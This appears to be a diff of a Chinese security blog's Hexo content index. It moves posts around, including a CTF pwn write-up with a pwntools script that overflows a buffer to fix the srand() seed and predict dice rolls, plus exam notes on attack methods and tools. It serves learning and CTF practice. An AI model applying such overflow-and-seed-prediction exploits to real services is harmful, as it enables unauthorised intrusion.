2c6b5e07cd419a3731cc9afdcdcc05d22e1548b5affa7a331e8b3e992e5a7159720c7a70ecbf4068bad6b1301dba0002ea4f744caf8a3151dfdf8f4e3ff2b1e616c556bb8f5ea94ad3eac72a037cf436014294053fdfd8d28b70d499a1f8e4f8da267c563f5b4688ef3aa849497f513bed02e7cd67938d1ee3a8c9523a1f5b5257fcea017b02ddb5f685a9469e416703e6034d356e756a26f74ae618c4ea17250917c305900c37e5cf130bd1fa429395009232ae96f6527f5970867a327a14d8efd78a225ed22c0c82e32fe1941c71e6f9d0c26e927255b7f9c47865bf385212e2946af6f27b3c3c09e9414d45ce08eb59d6b6dfb2f63a4132725ec032703221716f0de4a12e41fdf52194ed4a09d9ce2ba3711e954513abcc0bc54133793414c5d98200d382c61b15a0e9ec67afd393539333c08c34eb66198723e552fdafdbc6d57161e1c5254252df4346ff56e5de739a9fab550253a8f0e4167b90f2cd888336249b8a9ad6d3d6f056034d4564136236ca5dfb8987150a2a8eb04b0c37bfcdcbe03c59028730ca009e5b2c1dd40d099357ae3cd9e10834ebe65086f855b577c5e25f314312832d993d060852c2fcff9ce542097aae63482d9da36e4210ea0ade4e3cfa12fa98ac55b5fee08aabc2e2874b8e79217a2f3183cd169538f98deb96912d1f718872045d38fb247ba45c39eddc1d2fee0d82cd852b4dc9ea996de918c62b1119274d79be45a851e3b7ba32681f152548fd907b5675ad1f84f86aba102bdb275fcfdaa0752ef000a0515edf60ff17730491d64b83ae9029b58bb7957954c54b819ca5605cc17e09c0f16d28db268d854b361848359b8c735bfc8f2fd43c5ca7b27154f94ae35139c3cf8e2c2381fa37e68f831e4e2d35ff356fe3c30d5862861ac7a2e553474899a01407f56f891cd6f82671f79f16190f6df65d0800b288406fbeac2a3572bf0b1494d7005a41857456ede17f7d836f481f1a00a5e729c2c62977318e7735f74cd4496e51fa804f807ad43b419991d05fbfe96aa7ef8e78a9f7f40521670ceee6bc24f1f5fa219dd2be6e6b4c6e4f9505a4859a0f4b53a0b3fe04173453b640a29e1eadf503a21e8ae89ba0216c5c46464757961fefe423e03cca1d3853282af8386607f924e3b70b5b636606ebea1aaa0857b3f72c5127bab71028e012271a3188c81bf24f01462033e2619c9d712ed81d6960fcd2248ad7599aa627cab1ab46b46944aaadc56903b1b939bdaeb4617589893306f74558de90468bb3d3abb956f31403fd3339e457f078a38f6c67adff197c416af38954bdf575f8afe0064e0d2cd906829fe0ce7c322836845ff483d231bdb9756455d680760bcacab82c211b93d8a0367e096bdbf1a719468f096336f21c175b33e73c4501b543ec29efc457ed2bc4eb6fc1e9d5a24eb0b4333f1104afb6ae05c21cbce3b1dbe778bf23bf3005cec4e81dc08594398be108ac6c4d3e44f96eec8352a7efcd29835abe7e8eddff7edecfce12dd8a79a2deb6903386cbe2329416314e076f00d5c415c76053c14938adb85c1f69d19b986bb6321996f05acc053a784bb1f5875c99d389c0cbad16dbc84fd3cd38b50bb1a42848849401bca096cd59597b446209cd622bbde61eb34138787ca12f048368b6284736a52332eb875edd602ae957ca67082c24f161879c7815db72beaf692bf85c694bd51a167802222b1f96ed576fe4f014bf68812221fba65b3082f68d4956e5c7d74ac207fc967a0eb7784bbd703498296256e4249935f3e1d50e0e7970dcba48b3c912d33e7012ff3ec9aa1525b883542fb676b22ca24a814beb43efadb871cb2e7714d769b2b4c50ab9e1839117f17275b72f2485aff4bff21dc505b75a4d488e0fe43d229356565fe7acc47397e97ce89382ccc5f6947b0e15f66e30e5f55c886ce6d5d8baa7dcbbe1d5cfcd0096d532d3e14cdaf7d2ba8afafbc05635bdfc24eb9eb363ae4012121db9b8fc89fedaf70c912e6762215b6c6004e70d667ebf02671951e3f416baabbace75ddde422ccef1e652bafb22526eaac0089c96fe3af51f16e789d796257e7008387653f7b4df2bb2204b212cd9f7703081e9ddff6719d552ce6794480650918d39b08c599d97b989b282c076f102515605ffda0a044fab35f68eca074eaa960ba59feb1c6fb2fd8ad80c271d5b2d3c87562227df4aa96ae962ff2386b4747799921483ef8f84c9dcd3f87d</script>
-</div>
-<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
-      <categories>
-        <category>渗透测试</category>
-      </categories>
-      <tags>
-        <tag>Redis</tag>
       </tags>
   </entry>
   <entry>
@@ -901,6 +901,39 @@
       </tags>
   </entry>
   <entry>
+    <title>PWN中伪随机数问题--srand()/rand()</title>
+    <url>/2020/09/07/PWN%E4%B8%AD%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%97%AE%E9%A2%98-srand-rand/</url>
+    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>PWN中通常使用srand()和rand()配合使用来设置伪随机数。通常当我们输入的数可以覆盖到srand()中的值时，我们可以预测rand()产生固定序列。</p>
+<a id="more"></a>
+<h1 id="0x01-关于rand-和sand"><a href="#0x01-关于rand-和sand" class="headerlink" title="0x01 关于rand()和sand()"></a>0x01 关于rand()和sand()</h1><h2 id="rand"><a href="#rand" class="headerlink" title="rand()"></a>rand()</h2><p>rand()函数是使用线性同余法生成随机数，因为其周期特别长，所以在一定范围内可以看成随机的。但每次生成都是固定的序列</p>
+<p>我们使用如下代码生成10个随机数：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; rand() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>此时查看运行结果，多次运行结果一样。</p>
+<p><img src="/2020/09/07/PWN%E4%B8%AD%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%97%AE%E9%A2%98-srand-rand/rand运行.png" style="zoom:50%;"></p>
+<h2 id="srand"><a href="#srand" class="headerlink" title="srand()"></a>srand()</h2><p>srand()为初始化随机数发生器，用于设置rand()产生随机数时的种子。传入的参数seed为unsigned int类型，通常我们会使用时间time(NULL)或time(0)作为seed。当我们不设置srand()时，将默认为srand(1)。如果我们设置某个固定的seed，那么虽然在同一次运行时，会有不同的随机数产生，但是对于这段程序的多次运行所得到的结果是不变的。如下代码：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		srand(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; rand() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>结果如图：</p>
+<p><img src="/2020/09/07/PWN%E4%B8%AD%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%97%AE%E9%A2%98-srand-rand/srand为2.png" style="zoom:50%;"></p>
+<h1 id="0x02-简单示例"><a href="#0x02-简单示例" class="headerlink" title="0x02 简单示例"></a>0x02 简单示例</h1><p><strong>攻防世界—dice_game</strong></p>
+<p>我们直接拖入ida看源码</p>
+<p><img src="/2020/09/07/PWN%E4%B8%AD%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%97%AE%E9%A2%98-srand-rand/dice-game.png" style="zoom:80%;"></p>
+<p>由于我们可以覆盖seed，所以再输入payload时，将seed设置为1.</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x40</span> + p64(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<p>此时，我们就直接使用给出的libc来自动计算随机数</p>
+<p>python脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">p = remote(IP，port)</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">libc.srand(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">64</span> + p64(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome, let me know your name: &#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">    payload = str(libc.rand() % <span class="number">6</span> + <span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Give me the point(1~6): &#x27;</span>,payload)</span><br><span class="line">    </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><strong>ctypes包的cdll.LoadLibrary(‘libc.so.xxx’)可以在在脚本中加载动态库，同时又能调用库中的函数。</strong></p>
+<h1 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h1><p><a href="https://blog.csdn.net/u013745804/article/details/82379266">关于rand()和srand()</a></p>
+<p><a href="https://blog.csdn.net/weixin_39194641/article/details/103089862">CTF中的PWN——srand()/rand()漏洞（栈溢出）</a></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>2020年软考--信息安全工程师学习笔记</title>
     <url>/2020/09/09/2020%E5%B9%B4%E8%BD%AF%E8%80%83-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
     <content><![CDATA[<p>2020年准备报考信息安全工程师，8月底出了《信息安全工程师教程（第2版）》，原来8大章节变成了26章（？？？），考试出题也以新版教程和大纲出题。</p>
@@ -938,120 +971,6 @@
 <p><strong>结果来了</strong>：</p>
 <p><img src="/2020/09/09/2020%E5%B9%B4%E8%BD%AF%E8%80%83-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/软考.jpg" alt></p>
 <p>哈哈，居然被我这个渣渣混过去了，就整理了书上内容，整理完开始忙起来就没看，没想到低分飘过。</p>
-]]></content>
-      <categories>
-        <category>信息安全工程师软考</category>
-      </categories>
-      <tags>
-        <tag>学习笔记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>PWN中伪随机数问题--srand()/rand()</title>
-    <url>/2020/09/07/PWN%E4%B8%AD%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%97%AE%E9%A2%98-srand-rand/</url>
-    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>PWN中通常使用srand()和rand()配合使用来设置伪随机数。通常当我们输入的数可以覆盖到srand()中的值时，我们可以预测rand()产生固定序列。</p>
-<a id="more"></a>
-<h1 id="0x01-关于rand-和sand"><a href="#0x01-关于rand-和sand" class="headerlink" title="0x01 关于rand()和sand()"></a>0x01 关于rand()和sand()</h1><h2 id="rand"><a href="#rand" class="headerlink" title="rand()"></a>rand()</h2><p>rand()函数是使用线性同余法生成随机数，因为其周期特别长，所以在一定范围内可以看成随机的。但每次生成都是固定的序列</p>
-<p>我们使用如下代码生成10个随机数：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; rand() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>此时查看运行结果，多次运行结果一样。</p>
-<p><img src="/2020/09/07/PWN%E4%B8%AD%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%97%AE%E9%A2%98-srand-rand/rand运行.png" style="zoom:50%;"></p>
-<h2 id="srand"><a href="#srand" class="headerlink" title="srand()"></a>srand()</h2><p>srand()为初始化随机数发生器，用于设置rand()产生随机数时的种子。传入的参数seed为unsigned int类型，通常我们会使用时间time(NULL)或time(0)作为seed。当我们不设置srand()时，将默认为srand(1)。如果我们设置某个固定的seed，那么虽然在同一次运行时，会有不同的随机数产生，但是对于这段程序的多次运行所得到的结果是不变的。如下代码：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		srand(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; rand() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>结果如图：</p>
-<p><img src="/2020/09/07/PWN%E4%B8%AD%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%97%AE%E9%A2%98-srand-rand/srand为2.png" style="zoom:50%;"></p>
-<h1 id="0x02-简单示例"><a href="#0x02-简单示例" class="headerlink" title="0x02 简单示例"></a>0x02 简单示例</h1><p><strong>攻防世界—dice_game</strong></p>
-<p>我们直接拖入ida看源码</p>
-<p><img src="/2020/09/07/PWN%E4%B8%AD%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%97%AE%E9%A2%98-srand-rand/dice-game.png" style="zoom:80%;"></p>
-<p>由于我们可以覆盖seed，所以再输入payload时，将seed设置为1.</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x40</span> + p64(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
-<p>此时，我们就直接使用给出的libc来自动计算随机数</p>
-<p>python脚本如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">p = remote(IP，port)</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">libc.srand(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">64</span> + p64(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome, let me know your name: &#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">    payload = str(libc.rand() % <span class="number">6</span> + <span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Give me the point(1~6): &#x27;</span>,payload)</span><br><span class="line">    </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p><strong>ctypes包的cdll.LoadLibrary(‘libc.so.xxx’)可以在在脚本中加载动态库，同时又能调用库中的函数。</strong></p>
-<h1 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h1><p><a href="https://blog.csdn.net/u013745804/article/details/82379266">关于rand()和srand()</a></p>
-<p><a href="https://blog.csdn.net/weixin_39194641/article/details/103089862">CTF中的PWN——srand()/rand()漏洞（栈溢出）</a></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>第2章 网络攻击原理与常用方法</title>
-    <url>/2020/09/10/%E7%AC%AC2%E7%AB%A0-%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95/</url>
-    <content><![CDATA[<h1 id="网络攻击概述"><a href="#网络攻击概述" class="headerlink" title="网络攻击概述"></a>网络攻击概述</h1><h2 id="网络攻击概念"><a href="#网络攻击概念" class="headerlink" title="网络攻击概念"></a>网络攻击概念</h2><p>常见的危害行为：</p>
-<ul>
-<li>信息泄露攻击</li>
-<li>完整性破坏攻击</li>
-<li>拒绝服务攻击</li>
-<li>非法使用攻击</li>
-</ul>
-<a id="more"></a>
-<p><img src="/2020/09/10/%E7%AC%AC2%E7%AB%A0-%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95/攻击原理.jpg" alt></p>
-<h2 id="网络攻击模型"><a href="#网络攻击模型" class="headerlink" title="网络攻击模型"></a>网络攻击模型</h2><ol>
-<li>攻击树模型：进行费效或概率分析，建模复杂场景；不能建模循环事件。</li>
-<li>MITRE ATT&amp;CK模型：战术有访问初始化、执行、常驻、提权、防御规避、访问凭证、发现、横向移动、收集、数据获取、命令和控制。</li>
-<li>网络杀伤链模型：目标侦察、武器构造、载荷投送、漏洞利用、安装植入、指挥和控制、目标行动。</li>
-</ol>
-<h1 id="网络攻击的一般过程"><a href="#网络攻击的一般过程" class="headerlink" title="网络攻击的一般过程"></a>网络攻击的一般过程</h1><ol>
-<li>隐藏攻击源。（利用被侵入的主机作跳板、免费代理网关、伪造IP地址、假冒用户账号）</li>
-<li>收集攻击目标信息。（一般信息、配置信息、安全漏洞、安全防护措施、用户信息）</li>
-<li>挖掘漏洞信息。（系统或应用服务软件漏洞、主机信任关系漏洞、目标网络的使用者漏洞、通信协议漏洞、网络业务系统漏洞）</li>
-<li>获取目标访问权限。（获取更高权限）</li>
-<li>隐蔽攻击行为。（连接隐藏、进程隐藏、文件隐蔽）</li>
-<li>实施攻击。（攻击其他被信任的主机和网络，修改或删除重要数据，窃听、下载敏感数据，停止网络服务，删除数据账号，修改数据记录）</li>
-<li>开辟后门。（放宽文件许可权限，开放不安全服务，修改系统配置、源代码，替换共享库文件，安装嗅探器，建立隐蔽信道）</li>
-<li>清除攻击痕迹。（篡改日志文件的审计信息，改变系统时间造成日志文件紊乱，删除或停止审计服务进程，干扰入侵检测系统正常运行，修改完整性标签）</li>
-</ol>
-<h1 id="网络攻击常见技术方法"><a href="#网络攻击常见技术方法" class="headerlink" title="网络攻击常见技术方法"></a>网络攻击常见技术方法</h1><p><strong>端口扫描</strong></p>
-<ul>
-<li>完全连接扫描（利用三次握手，建立一次完整的连接）</li>
-<li>半连接扫描（三次握手过程中，只完成前两次握手）</li>
-<li>SYN扫描（发送连接请求，主机响应后，立即切断连接。若返回ACK信息，则表示端口开放，若返回RESET，则表示端口未开放）</li>
-<li>ID头信息扫描（源主机A向主机B发出连续PING包，源主机A假冒主机B向目标主机C发送SYN包，主机C向主机B发送两种可能的包（SYN|ACK，RST|ACK），查看主机B返回A的包ID头的值是否增加1，大于1则端口非开放。）</li>
-<li>隐蔽扫描（绕过IDS、防火墙等安全机制）</li>
-<li>SYN|ACK扫描（直接发送SYN|ACK包，目标主机认为是一次错误连接，若端口没开放，则返回RST信息；若端口开发，则不返回任何信息）</li>
-<li>FIN扫描（发送FIN包，若返回RESET信息，则端口关闭；若没返回任何信息，则端口开放）</li>
-<li>ACK扫描（先发送FIN包，查看反馈数据包的TTL值和WIN值。端口开放：TTL<64，WIN>0；端口关闭：TTL&gt;64，WIN=0）</64，WIN></li>
-<li>NULL扫描（源主机将数据包中ACK、FIN、RST、SYN、URG、PSH等标志位全部置空。若未返回信息，则端口开放；若返回RST信息，则端口关闭）</li>
-<li>XMAS扫描（将数据包中ACK、FIN、RST、SYN、URG、PSH等头标志位全部置1.若未返回信息，则端口开放；若返回RST信息，则端口关闭）</li>
-</ul>
-<p><strong>口令破解</strong></p>
-<p><strong>缓冲区溢出</strong></p>
-<p>攻击者将特意构造的攻击代码植入缓冲区溢出漏洞的程序中，改变漏洞程序的执行过程，获取攻击主机的控制权。</p>
-<p><strong>恶意代码</strong></p>
-<p>类型有计算机病毒、网络蠕虫、特洛伊木马、后门、逻辑炸弹、僵尸网络等</p>
-<p><strong>拒绝服务</strong></p>
-<p>特点：①难确认性②隐蔽性③资源有限性④软件复杂性</p>
-<ul>
-<li>同步包风暴（SYN Flood）</li>
-<li>UDP洪水（UDP Flood）</li>
-<li>Smurf攻击</li>
-<li>垃圾邮件</li>
-<li>消耗CPU和内存资源等拒绝服务攻击</li>
-<li>死亡之ping（ping of death）</li>
-<li>泪滴攻击（Teardrop Attack）</li>
-<li>分布式拒绝服务攻击（Distribute Denial of Service Attack）</li>
-</ul>
-<p><strong>网络钓鱼</strong></p>
-<p><strong>网络窃听</strong></p>
-<p>技术手段：网络嗅探、中间人攻击</p>
-<p><strong>SQL注入</strong></p>
-<p><strong>社交工程</strong></p>
-<p><strong>电子监听</strong></p>
-<p><strong>会话劫持</strong></p>
-<p><strong>漏洞扫描</strong></p>
-<p>扫描技术：CGI漏洞扫描、弱口令扫描、操作系统漏洞扫描、数据库漏洞扫描</p>
-<p><strong>代理技术</strong></p>
-<p><strong>数据加密</strong></p>
-<h1 id="黑客常用工具"><a href="#黑客常用工具" class="headerlink" title="黑客常用工具"></a>黑客常用工具</h1><p><strong>扫描器</strong>：NMAP、Nessus、SuperScan</p>
-<p><strong>远程监控</strong>：冰河、网络精灵、Netcat</p>
-<p><strong>密码破解</strong>：John the Ripper、LOphtCrack</p>
-<p><strong>网络嗅探器</strong>：Tcpdump/WireShark、DSniff</p>
-<p><strong>安全渗透工具箱</strong>：Metasploit、BackTrack5</p>
 ]]></content>
       <categories>
         <category>信息安全工程师软考</category>
@@ -1185,34 +1104,84 @@
       </tags>
   </entry>
   <entry>
-    <title>hexo及next主题使用问题记录</title>
-    <url>/2020/09/11/hexo%E5%8F%8Anext%E4%B8%BB%E9%A2%98%E4%BD%BF%E7%94%A8%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<p><strong>不定期更新各类使用过程中遇到的问题</strong></p>
-<p>使用版本：hexo 5.1&amp;&amp;next 7.8</p>
+    <title>第2章 网络攻击原理与常用方法</title>
+    <url>/2020/09/10/%E7%AC%AC2%E7%AB%A0-%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95/</url>
+    <content><![CDATA[<h1 id="网络攻击概述"><a href="#网络攻击概述" class="headerlink" title="网络攻击概述"></a>网络攻击概述</h1><h2 id="网络攻击概念"><a href="#网络攻击概念" class="headerlink" title="网络攻击概念"></a>网络攻击概念</h2><p>常见的危害行为：</p>
+<ul>
+<li>信息泄露攻击</li>
+<li>完整性破坏攻击</li>
+<li>拒绝服务攻击</li>
+<li>非法使用攻击</li>
+</ul>
 <a id="more"></a>
-<h1 id="问题一："><a href="#问题一：" class="headerlink" title="问题一："></a>问题一：</h1><p>点击“阅读全文”后，会直接滚动到原文中\<!-- more -->下，且config里面没有scroll_to_more配置，如何从头开始阅读。</p>
-<p>参考博文<a href="https://blog.csdn.net/weizhixiang/article/details/105112467">hexo关于next主题scroll_to_more失效</a>进行如下设置</p>
-<p>修改\themes\next\layout_macro\post.swig中</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;btn&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&#123;&#123; url_for(post.path) &#125;&#125;#more&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;contents&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>为</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;btn&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&#123;&#123; url_for(post.path) &#125;&#125;&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;contents&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<h1 id="问题二："><a href="#问题二：" class="headerlink" title="问题二："></a>问题二：</h1><p>markdown语法嵌入数学公式无法正常显示</p>
-<p>参考<a href="https://www.jianshu.com/p/7ab21c7f0674">在Hexo中渲染MathJax数学公式</a></p>
-<p>更换渲染引擎：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm uninstall hexo-renderer-marked --save</span><br><span class="line">npm install hexo-renderer-kramed --save</span><br></pre></td></tr></table></figure>
-<p>更改node_modules\kramed\lib\rules\inline.js文件中第11行和第20行</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//  escape: /^\\([\\`*&#123;&#125;\[\]()#$+\-.!_&gt;])/,</span></span><br><span class="line">  <span class="built_in">escape</span>: <span class="regexp">/^\\([`*\[\]()#$+\-.!_&gt;])/</span>，</span><br></pre></td></tr></table></figure>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//  em: /^\b_((?:__|[\s\S])+?)_\b|^\*((?:\*\*|[\s\S])+?)\*(?!\*)/,</span></span><br><span class="line">  em: <span class="regexp">/^\*((?:\*\*|[\s\S])+?)\*(?!\*)/</span></span><br></pre></td></tr></table></figure>
-<p>在主题中配置文件中开启mathjax开关</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># MathJax Support</span></span><br><span class="line">mathjax:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line">  per_page: <span class="literal">true</span></span><br></pre></td></tr></table></figure>
-<p>还需要在文章的Front-matter里打开mathjax开关</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: index.html</span><br><span class="line">date: 2016-12-28 21:01:30</span><br><span class="line">tags:</span><br><span class="line">mathjax: true</span><br><span class="line">--</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/09/10/%E7%AC%AC2%E7%AB%A0-%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95/攻击原理.jpg" alt></p>
+<h2 id="网络攻击模型"><a href="#网络攻击模型" class="headerlink" title="网络攻击模型"></a>网络攻击模型</h2><ol>
+<li>攻击树模型：进行费效或概率分析，建模复杂场景；不能建模循环事件。</li>
+<li>MITRE ATT&amp;CK模型：战术有访问初始化、执行、常驻、提权、防御规避、访问凭证、发现、横向移动、收集、数据获取、命令和控制。</li>
+<li>网络杀伤链模型：目标侦察、武器构造、载荷投送、漏洞利用、安装植入、指挥和控制、目标行动。</li>
+</ol>
+<h1 id="网络攻击的一般过程"><a href="#网络攻击的一般过程" class="headerlink" title="网络攻击的一般过程"></a>网络攻击的一般过程</h1><ol>
+<li>隐藏攻击源。（利用被侵入的主机作跳板、免费代理网关、伪造IP地址、假冒用户账号）</li>
+<li>收集攻击目标信息。（一般信息、配置信息、安全漏洞、安全防护措施、用户信息）</li>
+<li>挖掘漏洞信息。（系统或应用服务软件漏洞、主机信任关系漏洞、目标网络的使用者漏洞、通信协议漏洞、网络业务系统漏洞）</li>
+<li>获取目标访问权限。（获取更高权限）</li>
+<li>隐蔽攻击行为。（连接隐藏、进程隐藏、文件隐蔽）</li>
+<li>实施攻击。（攻击其他被信任的主机和网络，修改或删除重要数据，窃听、下载敏感数据，停止网络服务，删除数据账号，修改数据记录）</li>
+<li>开辟后门。（放宽文件许可权限，开放不安全服务，修改系统配置、源代码，替换共享库文件，安装嗅探器，建立隐蔽信道）</li>
